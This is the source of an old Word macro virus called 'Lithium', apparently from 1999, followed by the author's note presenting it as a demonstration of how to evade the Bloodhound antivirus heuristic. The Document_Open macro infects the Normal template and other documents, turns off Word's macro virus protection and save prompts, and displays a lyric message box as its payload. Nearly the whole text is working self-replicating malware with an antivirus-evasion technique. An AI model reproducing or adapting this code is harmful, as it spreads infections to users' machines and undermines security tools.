Private Sub Document_Open()
y = y + 1
Set a = Word.Application.Application
Set j = a.MacroContainer
Set k = j.VBProject.vbcomponents(y)
Set c = k.codemodule
If j = a.NormalTemplate Then Set i = a.ActiveDocument Else Set i = a.NormalTemplate
Set e = i.VBProject
a.Options.VirusProtection = vbEmpty
a.Options.SaveNormalPrompt = vbEmpty
With e.vbcomponents(y).codemodule
If Not .lines(16, y) Like "'L*m*" Then .deletelines y, .countoflines: .insertlines y, c.lines(y, 19)
End With
If InStr(y, VBA.Time, "5") Then MsgBox "I'm so happy 'cause today I found my friends, they are in my head." & vbCrLf & "I'm so ugly, thats ok 'cause so are you. Broken mirrors." & vbCrLf & "Sunday morning is every day for all I care and I'm not scared." & vbCrLf & "Light my candles in a days 'cause I forgot...", vbInformation, "Lithium"
End Sub
'Lithium / (c) 1999 jackie
'(Prove sample of Anti-Bloodhound code)
'No backdrops and no lights can focus
'on that shit...Linezer0 Oldskewl Tribe

---[snip]---

 Hi there kids, this some very old werk to show you how to code anti-
bloodhound-heuristically. Well, it's just a basic example to prove
that it's possible to bypass that heuristic. xD Just check it out and
enjoy!

Whatever tomorrow brings,
 jackie